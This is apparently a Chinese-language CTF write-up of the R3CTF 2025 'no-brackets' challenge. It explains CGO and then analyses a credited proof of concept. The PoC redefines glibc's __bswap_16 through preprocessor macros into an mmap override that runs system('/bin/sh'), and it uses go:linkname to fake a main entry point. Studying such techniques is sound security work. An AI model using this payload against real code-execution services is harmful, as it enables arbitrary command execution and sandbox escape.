---
title: R3CTF 2025 no-brackets —— CGO 符号劫持
date: 2025-07-11
last_modified_at: 2025-07-11 9:30:00 +0800
categories: [CTF]
tags: [go]
pin: false
math: true
mermaid: true
image:
  path: /assets/images/R3CTF-2025.jpg
toc: true

---

> 本文仅为 R3CTF 2025 payload 分析以及学习记录，payload 来自于 @cinabun

## 什么是 CGO
CGO 是 Go 语言提供的一个机制，允许 Go 程序调用 C 语言编写的代码。CGO 的核心功能包括：
1. 双向调用：Go 可以调用 C 函数，C 也可以调用 Go 函数
2. 数据类型转换：在 Go 和 C 之间自动进行数据类型转换
3. 内存管理：处理 Go 和 C 之间的内存分配和释放
4. 编译集成：在编译时将 C 代码与 Go 代码链接

### 环境准备
CGO 在 windows 上默认不开启，可以使用 go env 查看环境变量 CGO_ENABLED。如果要开启的话，可以将该环境变量设置为 1
```bash
root@9d65073e8fc6:/app# go env | grep CGO
CGO_CFLAGS='-O2 -g'
CGO_CPPFLAGS=''
CGO_CXXFLAGS='-O2 -g'
CGO_ENABLED='1'
CGO_FFLAGS='-O2 -g'
CGO_LDFLAGS='-O2 -g'
GCCGO='gccgo'
```

### 基本示例
```go
package main

/*
#include <stdio.h>
#include <stdlib.h>

void hello() {
    printf("Hello from C!\n");
}
*/
import "C"

func main() {
    C.hello()
}

// root@9d65073e8fc6:/app/src# go run test.go 
// Hello from C!
```

## R3CTF no-brackets
R3CTF no-brackets 这道赛题提供了一个场景：
1. 用户可以输入 go 代码。
2. go 代码中不允许包含字符 `[](){}<>`
3. 环境会使用 `go run` 编译并运行用户输入的 go 代码

由于不能使用括号，所以常规的 go 代码无法达到执行命令的效果，因此这道题的解法基本围绕 CGO 来实现。

下面是来自 @cinabun 的 poc：

### poc 分析
```go
package main
/*
#define __bswap_16 ___aaaa
#define __bswap_32 ___bbbb
#define __bswap_64 ___cccc
#include "stdlib.h"
#undef __bswap_16
#undef __bswap_32
#undef __bswap_64
#define _BYTESWAP_H
#undef _BITS_BYTESWAP_H
#define _NETINET_IN_H
#define static
#define __inline
#define __bswap_16 mmap
#define __uint16_t char *
#define __builtin_bswap16 system
#define return __bsx = "/bin/sh";
#include "bits/byteswap.h"
#undef __builtin_bswap16
#undef static
#undef __inline
#undef __uint16_t
#undef return
*/
import "C"
import _ "unsafe"
//go:linkname _Cgo_ptr main.main
```
该 poc 实现了对函数 __bswap_16 的替换，原函数位于 /usr/include/x86_64-linux-gnu/bits/byteswap.h 中。
- [byteswap.h source code [include/x86\_64-linux-gnu/bits/byteswap.h] - Codebrowser](https://codebrowser.dev/qt6/include/x86_64-linux-gnu/bits/byteswap.h.html)

函数定义如下：
```c
static __inline __uint16_t
__bswap_16 (__uint16_t __bsx)
{
#if __GNUC_PREREQ (4, 8)
  return __builtin_bswap16 (__bsx);
#else
  return __bswap_constant_16 (__bsx);
#endif
}
```
我们可以将 poc 分为几个部分：
1. 宏定义占位与重定义。
   首先用无害的名称占位原有的字节交换函数。包含 stdlib.h 时，由于 __bswap_16 这些宏已经存在，就不会再去重新定义，从而避免了冲突。
   
   引入 stdlib.h 后再取消定义，恢复未定义状态，为后续的恶意重定义做准备。
    ```c
    #define __bswap_16 ___aaaa
    #define __bswap_32 ___bbbb
    #define __bswap_64 ___cccc
    #include "stdlib.h"
    #undef __bswap_16
    #undef __bswap_32
    #undef __bswap_64
    ```
    
2. 头文件保护绕过。
   通过定义和取消定义头文件保护宏，控制哪些头文件被包含，确保后续的 bits/byteswap.h 能够按预期包含。
   
   `<byteswap.h> 的头文件保护宏就是 _BYTESWAP_H`，如果定义了该宏，则表示已经包含过 `<byteswap.h>` 了，之后任何 `#include <byteswap.h>` 都直接跳过。”

    真正存放 `__bswap_16/32/64` 内联实现的是 内部文件 `bits/byteswap.h`，它的 include-guard(头文件保护宏) 为 `_BITS_BYTESWAP_H`。当我们最开始 `#include <stdlib.h>` 时，glibc 的头文件链条里已经把 `bits/byteswap.h` 包过一次，于是 `_BITS_BYTESWAP_H` 已经被定义。

    ```c
    #define _BYTESWAP_H
    #undef _BITS_BYTESWAP_H
    #define _NETINET_IN_H
    ```
    `bits/byteswap.h` 本来是被 `<netinet/in.h>` 间接包含的，文件里会用如下地代码来阻止开发者手动引用。由于我们需要包含，所以需要设置该宏。这样就不会触发 `#error`，编译器也就不会终止。
    ```c
    #ifndef _NETINET_IN_H
       #error "Never include <bits/byteswap.h> directly"
    #endif
    ```
3. 关键宏重定义
    ```c
    #define static
    #define __inline
    #define __bswap_16 mmap
    #define __uint16_t char *
    #define __builtin_bswap16 system
    #define return __bsx = "/bin/sh";
    ```
    static 被定义为空，移除函数修饰符。如果保留 static，编译器会把这个函数视为“当前翻译单元私有符号”，不会导出到可执行文件的符号表里，也就无法覆盖 glibc 里的同名函数。<mark>去掉 static 后，它成了普通的全局符号 mmap，在链接阶段会 替换/优先级高于 动态库里的 mmap，从而让系统或运行时在加载早期就调用到我们篡改后的版本。</mark>
    __inline 被清空，可以确保编译器一定会把函数以可重定位符号的形式写进目标文件（即生成 .text 段里的 mmap 符号）。
    __bswap_16：被重定义为 mmap
    __uint16_t：被重定义为 char *
    __builtin_bswap16：被重定义为 system
    return：被重定义为 __bsx = "/bin/sh";
4. 攻击载荷触发
   当包含 bits/byteswap.h 时，原本的字节交换函数会被恶意重定义。
    ```c
    #include "bits/byteswap.h"
    ```
5. 重定义之后的代码如下：
    ```c
    char *
    mmap (char * __bsx)
    {
        __bsx = "/bin/sh"; system (__bsx);
    }
    ```
6. 伪装程序入口
   把编译器自动生成的全局变量 _Cgo_ptr 强行“伪装”成 可执行程序入口 main.main，从而在完全不写 `func main() {}` 的情况下，（也就不出现 {}、() 括号）的前提下，让链接器认为“入口函数”已经存在，顺利生成可执行文件。
    ```
    //go:linkname _Cgo_ptr main.main
    ```
    <mark>_Cgo_ptr 是什么？</mark> 只要文件里出现 import "C"，cgo 工具就会在生成的 *_cgo_import.go 里定义若干内部变量，其中之一叫 _Cgo_ptr（类型一般是 unsafe.Pointer）。这个符号对链接器来说一定存在，且名字固定，方便我们借用。
    
    <mark>为什么 Go 链接器需要 main.main？</mark> 构建可执行文件时，链接器会检查：main.main（用户入口）、main.init（自动生成的初始化），若缺少 main.main 就直接报错 “function main is undeclared in the main package”。


go run poc.go 首先会调用 go tool cgo → gcc/clang 把 C 代码编译成目标文件。此时伪造的 mmap 函数体会被写入可执行文件。

程序加载阶段，生成好的 ELF 被内核加载，随后由动态加载器（ld-linux.so / ld.so / dyld）解析依赖库、做符号解析。

<mark>ELF 规则规定：可执行文件自己的符号优先生效。因此加载器在为“所有出现 mmap 的重定位”寻找地址时，会首先锁定我们定义在可执行文件里的那版 mmap——把它写进对应 GOT/PLT 表项。</mark>
从这一刻开始，任何后续对 mmap 的调用（无论来自 glibc、Go runtime 还是用户代码）都会跳进我们的函数体。

<mark>为什么选择该函数？</mark>
1. 内联函数的核心特点是编译器会将函数调用替换为函数体的实际代码
2. 使用内置函数：依赖 __builtin_bswap16，可以通过宏重定义
3. 明确的返回语句：可以通过重定义 return 关键字注入恶意代码
4. 简单的参数结构：只有一个参数，便于控制和操作
5. 广泛使用：字节交换函数在网络编程和系统代码中被频繁调用
6. 由于 __bswap_16 是一个静态内联函数，编译器更有可能将其内联展开。这意味着恶意的宏替换代码会被直接嵌入到调用点，增加了攻击成功的概率。